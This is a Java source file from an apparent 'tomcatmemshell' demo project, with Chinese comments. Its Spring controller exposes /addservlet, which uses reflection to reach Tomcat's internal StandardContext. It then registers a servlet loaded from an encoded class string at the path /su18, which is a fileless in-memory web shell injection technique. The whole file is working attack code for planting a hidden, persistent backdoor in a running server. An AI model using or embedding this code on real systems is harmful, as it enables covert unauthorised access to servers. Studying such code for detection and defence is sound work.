package com.example.tomcatmemshell.demos.web.addservlet;

import com.example.tomcatmemshell.utils.DynamicUtils;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

import static com.example.tomcatmemshell.utils.DynamicUtils.FILTER_CLASS_STRING;
import static com.example.tomcatmemshell.utils.DynamicUtils.SERVLET_CLASS_STRING;


@Controller
public class AddServletController {


    @RequestMapping("/addservlet")
    @ResponseBody
    public String addservlet(HttpServletRequest req, HttpServletResponse resp) {
        try {
            String servletName = "su18Servlet";

            // 从 request 中获取 servletContext
            ServletContext servletContext = req.getServletContext();

            // 如果已有此 servletName 的 Servlet，则不再重复添加
            if (servletContext.getServletRegistration(servletName) == null) {

                StandardContext o = null;

                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                while (o == null) {
                    Field f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object object = f.get(servletContext);

                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        o = (StandardContext) object;
                    }
                }

                // 创建自定义 Servlet
                Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);

                // 使用 Wrapper 封装 Servlet
                Wrapper wrapper = o.createWrapper();
                wrapper.setName(servletName);
                wrapper.setLoadOnStartup(1);
                wrapper.setServlet((Servlet) servletClass.newInstance());
                wrapper.setServletClass(servletClass.getName());

                // 向 children 中添加 wrapper
                o.addChild(wrapper);

                // 添加 servletMappings
                o.addServletMappingDecoded("/su18", servletName);

                return "tomcat servlet added";
            }else{
                return "tomcat servlet already added";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "tomcat servlet add failed";
    }
}
